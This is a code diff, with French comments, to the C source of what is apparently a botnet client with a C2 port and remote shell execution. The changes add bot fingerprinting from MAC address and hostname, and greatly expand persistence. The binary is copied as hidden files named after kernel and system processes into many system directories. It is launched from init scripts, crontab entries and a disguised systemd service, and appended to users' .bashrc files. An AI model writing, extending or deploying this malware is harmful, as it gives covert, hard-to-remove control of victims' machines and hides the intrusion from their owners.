@@ -90,6 +90,10 @@ void persist(void);
 #define C2_PORT 1337
 #define BUFFER_SIZE 1024
 #define CMD_SIZE 512
+#define DEVICE_ID_SIZE 64
+
+// Identifiant unique pour ce bot
+char device_id[DEVICE_ID_SIZE] = {0};
 
 // Fonction pour exécuter une commande shell et retourner la sortie
 char* execute_command(char* command) {
@@ -1062,25 +1066,142 @@ void daemonize() {
     close(STDERR_FILENO);
 }
 
-// Fonction pour persister sur le système
-void persist() {
+// Fonction pour générer un identifiant unique pour ce bot
+void generate_device_id(void) {
+    if (device_id[0] != 0) return; // Déjà généré
+    
+    // Utiliser des informations matérielles pour créer un ID unique
+    FILE *fp;
+    char buffer[256] = {0};
+    char mac[18] = {0};
+    char hostname[64] = {0};
+    
+    // Essayer d'obtenir l'adresse MAC
+    fp = popen("cat /sys/class/net/eth0/address 2>/dev/null || cat /sys/class/net/wlan0/address 2>/dev/null || echo 00:00:00:00:00:00", "r");
+    if (fp) {
+        fgets(mac, sizeof(mac), fp);
+        pclose(fp);
+    }
+    
+    // Essayer d'obtenir le hostname
+    gethostname(hostname, sizeof(hostname));
+    
+    // Combiner les informations pour créer un ID unique
+    snprintf(device_id, DEVICE_ID_SIZE, "%s_%s_%ld", 
+             hostname[0] ? hostname : "unknown", 
+             mac[0] ? mac : "00:00:00:00:00:00", 
+             (long)time(NULL));
+    
+    // Remplacer les caractères non-alphanumériques
+    for (int i = 0; device_id[i]; i++) {
+        if (!isalnum(device_id[i]) && device_id[i] != '_') {
+            device_id[i] = 'x';
+        }
+    }
+}
+
+// Vérifier si un processus est en cours d'exécution
+int is_process_running(const char *process_name) {
+    char command[BUFFER_SIZE];
+    snprintf(command, sizeof(command), "ps aux | grep -v grep | grep -q '%s'", process_name);
+    return system(command) == 0;
+}
+
+// Fonction pour la persistance avancée
+void persist(void) {
     char command[BUFFER_SIZE*4];
     char path[BUFFER_SIZE];
-    if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) return;
-    // Copie dans plusieurs emplacements
-    snprintf(command, sizeof(command), "cp %s /usr/bin/sysupdate; cp %s /bin/sysupdate; cp %s /etc/sysupdate", path, path, path);
-    system(command);
-    // Ajout à la crontab root
-    system("(crontab -l 2>/dev/null; echo '@reboot /usr/bin/sysupdate') | crontab -");
-    // Ajout à /etc/rc.local
-    FILE *rc = fopen("/etc/rc.local", "a");
-    if (rc) { fprintf(rc, "/usr/bin/sysupdate &\n"); fclose(rc); }
-    // Création d'un service systemd
-    FILE *fp = fopen("/etc/systemd/system/sysupdate.service", "w");
+    char *hide_names[] = {
+        "sysupdate",
+        "systemd-worker",
+        "kworker",
+        "crond",
+        "udevd"
+    };
+    
+    // Sélectionner un nom aléatoire pour se cacher
+    char *hide_name = hide_names[time(NULL) % (sizeof(hide_names)/sizeof(hide_names[0]))];
+    
+    // Obtenir le chemin de l'exécutable actuel
+    if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) {
+        // Fallback si readlink échoue
+        strcpy(path, "/bin/sh"); // Valeur par défaut sécurisée
+    }
+    
+    // Générer l'ID unique du dispositif
+    generate_device_id();
+    
+    // 1. Copier dans plusieurs emplacements avec des noms différents
+    char *system_dirs[] = {
+        "/bin", "/usr/bin", "/usr/local/bin", "/tmp", "/var/tmp", "/dev", "/etc"
+    };
+    
+    for (int i = 0; i < sizeof(system_dirs)/sizeof(system_dirs[0]); i++) {
+        snprintf(command, sizeof(command), "cp %s %s/.%s 2>/dev/null && chmod +x %s/.%s", 
+                 path, system_dirs[i], hide_name, system_dirs[i], hide_name);
+        system(command);
+    }
+    
+    // 2. Ajouter à plusieurs fichiers d'initialisation
+    char *init_files[] = {
+        "/etc/rc.local",
+        "/etc/rc.d/rc.local",
+        "/etc/init.d/rcS",
+        "/etc/init.d/boot"
+    };
+    
+    for (int i = 0; i < sizeof(init_files)/sizeof(init_files[0]); i++) {
+        FILE *rc = fopen(init_files[i], "a");
+        if (rc) { 
+            fprintf(rc, "/bin/.%s & # %s\n", hide_name, device_id); 
+            fclose(rc); 
+        }
+    }
+    
+    // 3. Ajouter à la crontab avec plusieurs entrées
+    system("(crontab -l 2>/dev/null | grep -v sysupdate; echo '@reboot /bin/.sysupdate') | crontab - 2>/dev/null");
+    system("(crontab -l 2>/dev/null | grep -v kworker; echo '*/30 * * * * /usr/bin/.kworker') | crontab - 2>/dev/null");
+    
+    // 4. Créer un service systemd
+    FILE *fp = fopen("/etc/systemd/system/system-worker.service", "w");
     if (fp) {
-        fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/sysupdate\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n");
+        fprintf(fp, "[Unit]\nDescription=System Worker Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/.%s\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n", hide_name);
         fclose(fp);
-        system("systemctl enable sysupdate.service 2>/dev/null");
+        system("systemctl enable system-worker.service 2>/dev/null");
+    }
+    
+    // 5. Créer un fichier .bashrc caché pour infecter les utilisateurs qui se connectent
+    char *user_dirs[] = {
+        "/root", "/home/admin", "/home/user", "/home/pi"
+    };
+    
+    for (int i = 0; i < sizeof(user_dirs)/sizeof(user_dirs[0]); i++) {
+        char bashrc_path[BUFFER_SIZE];
+        snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", user_dirs[i]);
+        FILE *bashrc = fopen(bashrc_path, "a");
+        if (bashrc) {
+            fprintf(bashrc, "\n# System update\n(/bin/.%s &) > /dev/null 2>&1\n", hide_name);
+            fclose(bashrc);
+        }
+    }
+    
+    // 6. Vérifier si les processus sont déjà en cours d'exécution
+    int running = 0;
+    for (int i = 0; i < sizeof(hide_names)/sizeof(hide_names[0]); i++) {
+        char process_name[BUFFER_SIZE];
+        snprintf(process_name, sizeof(process_name), ".%s", hide_names[i]);
+        if (is_process_running(process_name)) {
+            running = 1;
+            break;
+        }
+    }
+    
+    // 7. Lancer les processus s'ils ne sont pas déjà en cours d'exécution
+    if (!running) {
+        for (int i = 0; i < sizeof(system_dirs)/sizeof(system_dirs[0]); i++) {
+            snprintf(command, sizeof(command), "%s/.%s & > /dev/null 2>&1", system_dirs[i], hide_name);
+            system(command);
+        }
     }
 }
 
